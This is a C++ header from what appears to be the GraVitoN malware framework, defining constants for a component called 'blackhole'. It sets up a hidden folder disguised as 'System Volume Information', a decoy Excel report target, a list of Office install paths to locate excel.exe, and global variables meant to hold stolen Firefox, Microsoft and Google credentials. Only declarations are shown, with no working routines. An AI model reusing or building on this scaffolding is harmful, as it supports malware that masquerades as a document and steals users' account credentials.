/**
 * @file
 * @author  Sina Hatef Matbue ( _null_ ) <sinahatef.cpp@gmail.com>
 *
 * @section License
 *
 * This file is part of GraVitoN.
 *
 * Graviton is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Graviton is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with Graviton.  If not, see http://www.gnu.org/licenses/.
 *
 * @brief blackhole's primary header containing its constants and defines.
 *
 */

#define DARK_PATH "System Volume Informations"
#define TARGET "report.xlsx"
#define TARGET_EXEC "excel.exe"

#define GVN_ACTIVATE_LOGGER
#define GVN_LOG_FILE DARK_PATH"\\graviton_logs.txt"
#define sayshit(__X__) GraVitoN::Core::Logger::logItLn(__X__)

#include <graviton.hpp>
#include <core/memory.hpp>
#include <utils/file.hpp>
#include <utils/directory.hpp>

const string cwd = GraVitoN::Utils::Directory::cwd().getPath() + "\\";
const int SP_SIZE = 32;
const string search_path[] =
{
	"C:\\Program Files\\Microsoft Office\\Office10\\",
	"C:\\Program Files\\Microsoft Office\\Office11\\",
	"C:\\Program Files\\Microsoft Office\\Office12\\",
	"C:\\Program Files\\Microsoft Office\\Office13\\",
	"C:\\Program Files\\Microsoft Office\\Office14\\",
	"C:\\Program Files\\Microsoft Office\\Office15\\",
	"C:\\Program Files\\Microsoft Office\\root\\Office16\\",
	"C:\\Program Files\\Microsoft Office\\root\\Office17\\",
	"D:\\Program Files\\Microsoft Office\\Office10\\",
	"D:\\Program Files\\Microsoft Office\\Office11\\",
	"D:\\Program Files\\Microsoft Office\\Office12\\",
	"D:\\Program Files\\Microsoft Office\\Office13\\",
	"D:\\Program Files\\Microsoft Office\\Office14\\",
	"D:\\Program Files\\Microsoft Office\\Office15\\",
	"D:\\Program Files\\Microsoft Office\\root\\Office16\\",
	"D:\\Program Files\\Microsoft Office\\root\\Office17\\",
	"C:\\Program Files (x86)\\Microsoft Office\\Office10\\",
	"C:\\Program Files (x86)\\Microsoft Office\\Office11\\",
	"C:\\Program Files (x86)\\Microsoft Office\\Office12\\",
	"C:\\Program Files (x86)\\Microsoft Office\\Office13\\",
	"C:\\Program Files (x86)\\Microsoft Office\\Office14\\",
	"C:\\Program Files (x86)\\Microsoft Office\\Office15\\",
	"C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\",
	"C:\\Program Files (x86)\\Microsoft Office\\root\\Office17\\",
	"D:\\Program Files (x86)\\Microsoft Office\\Office10\\",
	"D:\\Program Files (x86)\\Microsoft Office\\Office11\\",
	"D:\\Program Files (x86)\\Microsoft Office\\Office12\\",
	"D:\\Program Files (x86)\\Microsoft Office\\Office13\\",
	"D:\\Program Files (x86)\\Microsoft Office\\Office14\\",
	"D:\\Program Files (x86)\\Microsoft Office\\Office15\\",
	"D:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\",
	"D:\\Program Files (x86)\\Microsoft Office\\root\\Office17\\",
};

string uname, current_user;
string darkwd;

string firefucks_creds, microsucks_creds, googass_creds;


